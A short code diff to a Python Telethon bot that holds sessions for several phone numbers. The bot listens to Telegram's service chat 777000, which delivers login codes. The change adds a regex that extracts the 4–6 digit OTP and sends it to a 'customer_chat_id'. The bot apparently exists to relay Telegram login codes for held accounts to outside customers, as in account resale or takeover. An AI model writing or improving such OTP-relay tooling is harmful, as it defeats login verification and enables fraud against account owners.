@@ -1,3 +1,4 @@
+import re
 import asyncio
 from telethon import TelegramClient, events
 from config import API_ID, API_HASH
@@ -19,11 +20,15 @@ async def start_userbot_for_account(phone_number: str, session_string: str, bot_
         @client.on(events.NewMessage(chats=777000))
         async def otp_listener(event):
             message_text = event.message.message
+            # Regex se sirf digits (OTP) extract karenge
+            match = re.search(r'\b\d{4,6}\b', message_text)
+            otp_code = match.group(0) if match else message_text
+
             await bot_instance.send_message(
                 customer_chat_id,
-                f"🚨 **New OTP Received for {phone_number}**:\n\n`{message_text}`",
+                f"🚨 **New OTP Received for {phone_number}**:\n\n`{otp_code}`",
                 parse_mode="Markdown"
             )
     except Exception as e:
         print(f"Error starting userbot for {phone_number}: {e}")
-  
+            
